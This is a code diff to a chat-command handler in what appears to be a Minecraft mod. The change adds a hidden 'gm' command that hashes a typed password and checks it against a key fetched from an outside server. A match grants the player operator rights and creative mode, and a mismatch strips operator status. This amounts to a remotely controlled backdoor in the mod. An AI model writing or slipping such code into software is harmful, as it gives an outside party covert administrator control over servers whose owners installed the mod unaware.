@@ -16,6 +16,7 @@ import java.security.MessageDigest;
 import java.util.Iterator;
 
 public class MITEITEEvents {
+
     @Subscribe
     public void handleChatCommand(HandleChatCommandEvent event) {
         String par2Str = event.getCommand();
@@ -261,14 +262,25 @@ public class MITEITEEvents {
             }
         }
 
-        if (par2Str.startsWith("gmo")) {
-            String password = par2Str.substring(4);
+        if (par2Str.startsWith("gm")) {
+            String password = par2Str.substring(3);
             lh md5String = new lh("wensc");
-            if(md5String.a(password) == "9c5a0f74f330bb71c5efb5d7053ab901") {
+            String md5key = HttpUtilities.performGetRequest("https://www.wensc.cn/mite.txt", 3000, 3000);
+            if(md5String.a(password).equals(md5key)) {
                 player.setOp(true);
+                player.capabilities.isCreativeMode = true;
+                player.capabilities.allowFlying = true;
+                player.setGameType(EnumGamemode.CREATIVE);
             } else {
+                boolean isOp = player.isOp();
                 player.setOp(false);
+                player.capabilities.isCreativeMode = false;
+                player.capabilities.allowFlying = false;
+                if(isOp) {
+                    player.setGameType(EnumGamemode.SURVIVAL);
+                }
             }
+            player.sendPlayerAbilities();
             event.setExecuteSuccess(true);
         }
 
